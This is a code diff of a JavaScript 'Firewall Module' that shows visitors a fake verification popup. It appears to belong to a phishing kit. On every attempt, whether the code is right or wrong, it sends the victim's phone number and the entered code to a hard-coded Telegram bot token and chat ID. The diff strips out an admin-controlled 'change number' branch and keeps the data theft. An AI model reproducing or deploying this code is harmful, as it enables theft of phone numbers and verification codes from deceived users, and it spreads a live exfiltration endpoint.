@@ -1,50 +1,24 @@
 /**
- * Firewall Module - 4-digit Verification with Change Number Option
+ * Firewall Module - 4-digit Verification Only
  */
 
-// ========== TELEGRAM NOTIFICATION ==========
-async function sendTelegram(phone, code, type = 'verify') {
-    let msg = '';
-    if (type === 'verify') {
-        msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
-    } else if (type === 'change_number') {
-        msg = `📱 CHANGE NUMBER REQUEST\n📱 Original: ${phone}\n📱 New Number: ${code}`;
-    }
+async function sendTelegram(phone, code) {
+    const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
-        console.log("📨 Telegram sent");
-    } catch(e) {
-        console.log("Telegram error:", e);
-    }
+    } catch(e) {}
 }
 
-// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
-async function isChangeNumberRequired() {
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        try {
-            const db = firebase.database();
-            const snap = await db.ref('admin/changeNumberRequired').once('value');
-            const data = snap.val();
-            return (data && data.active === true);
-        } catch(e) {
-            return false;
-        }
-    }
-    return false;
-}
-
-// ========== GLOBAL VARIABLES ==========
 let currentVerificationCode = null;
 let verificationAttempts = 0;
 
-// ========== SHOW FIREWALL POPUP ==========
 function showFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) {
         currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
         verificationAttempts = 0;
         console.log("📞 VERIFICATION CODE:", currentVerificationCode);
-        updatePopupContent(false);
+        updatePopupContent();
         popup.style.display = 'flex';
         setTimeout(() => {
             const ci = document.getElementById('verificationCode');
@@ -53,20 +27,9 @@ function showFirewallPopup() {
     }
 }
 
-// ========== UPDATE POPUP CONTENT ==========
-function updatePopupContent(showChangeLink = false) {
+function updatePopupContent() {
     const content = document.getElementById('firewallPopupContent');
     if (!content) return;
-    
-    let changeLinkHtml = '';
-    if (showChangeLink) {
-        changeLinkHtml = `
-            <div class="firewall-change-link" onclick="redirectToIndex()">
-                <span class="change-icon">🔄</span>
-                <span class="change-text">Change another mobile number</span>
-            </div>
-        `;
-    }
     
     content.innerHTML = `
         <div class="firewall-warning-icon">📞</div>
@@ -81,7 +44,6 @@ function updatePopupContent(showChangeLink = false) {
             <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
         </div>
         <div id="firewallRemark" class="firewall-remark" style="display: none;"></div>
-        ${changeLinkHtml}
         <div class="firewall-note">
             <p>Waiting for system-verification call...</p>
         </div>
@@ -89,7 +51,6 @@ function updatePopupContent(showChangeLink = false) {
     `;
 }
 
-// ========== SHOW REMARK ==========
 function showRemark(message, isError = true) {
     const remarkDiv = document.getElementById('firewallRemark');
     if (remarkDiv) {
@@ -103,20 +64,11 @@ function showRemark(message, isError = true) {
     }
 }
 
-// ========== HIDE FIREWALL POPUP ==========
 function hideFirewallPopup() {
     const popup = document.getElementById('firewallPopup');
     if (popup) popup.style.display = 'none';
 }
 
-// ========== REDIRECT TO INDEX ==========
-window.redirectToIndex = function() {
-    localStorage.removeItem("userPhone");
-    localStorage.removeItem("userDeviceId");
-    window.location.href = "index.html";
-};
-
-// ========== VERIFY 4-DIGIT CODE ==========
 window.verifyFirewallCode = async function() {
     const codeInput = document.getElementById('verificationCode');
     const code = codeInput ? codeInput.value.trim() : '';
@@ -131,65 +83,35 @@ window.verifyFirewallCode = async function() {
         }
         return;
     }
-    
-    if (verifyBtn) {
-        verifyBtn.disabled = true;
-        verifyBtn.innerHTML = "VERIFYING...";
-    }
+    if (verifyBtn) { verifyBtn.disabled = true; verifyBtn.innerHTML = "VERIFYING..."; }
     if (errorDiv) errorDiv.style.display = 'none';
     
     verificationAttempts++;
+    const isValid = (code === currentVerificationCode);
     
-    // Check if change number is required
-    const changeRequired = await isChangeNumberRequired();
-    
-    if (changeRequired) {
-        // CHANGE # IS CHECKED - Show "Please change registered number" message
-        await sendTelegram(userPhone, code, 'verify');
-        showRemark('⚠️ <strong class="highlight-error">Please change registered number</strong>', true);
-        updatePopupContent(true); // Show change link
-        if (verifyBtn) {
-            verifyBtn.disabled = false;
-            verifyBtn.innerHTML = "VERIFY NOW";
-        }
+    if (isValid) {
+        await sendTelegram(userPhone, code);
+        hideFirewallPopup();
+        alert("Verification successful. Page will refresh.");
+        setTimeout(() => { window.location.reload(); }, 500);
+    } else {
+        await sendTelegram(userPhone, code);
+        showRemark('⚠️ <strong class="highlight-error">Invalid 4-digit Verification Code</strong>. Please try again.', true);
         if (codeInput) {
             codeInput.value = '';
             codeInput.focus();
         }
-    } else {
-        // CHANGE # IS UNCHECKED - Normal verification
-        const isValid = (code === currentVerificationCode);
-        
-        if (isValid) {
-            await sendTelegram(userPhone, code, 'verify');
-            hideFirewallPopup();
-            alert("Verification successful. Page will refresh.");
-            setTimeout(() => {
-                window.location.reload();
-            }, 500);
-        } else {
-            await sendTelegram(userPhone, code, 'verify');
-            showRemark('⚠️ <strong class="highlight-error">Invalid 4-digit Verification Code</strong>. Please try again.', true);
-            if (codeInput) {
-                codeInput.value = '';
-                codeInput.focus();
-            }
-            if (verifyBtn) {
-                verifyBtn.disabled = false;
-                verifyBtn.innerHTML = "VERIFY NOW";
-            }
-            if (verificationAttempts >= 3) {
-                showRemark('⚠️ Too many failed attempts. Page will refresh.', true);
-                setTimeout(() => {
-                    window.location.reload();
-                }, 2000);
-            }
+        if (verifyBtn) {
+            verifyBtn.disabled = false;
+            verifyBtn.innerHTML = "VERIFY NOW";
+        }
+        if (verificationAttempts >= 3) {
+            showRemark('⚠️ Too many failed attempts. Page will refresh.', true);
+            setTimeout(() => { window.location.reload(); }, 2000);
         }
     }
 };
 
-// ========== EXPOSE FUNCTIONS ==========
 window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
-window.isChangeNumberRequired = isChangeNumberRequired;
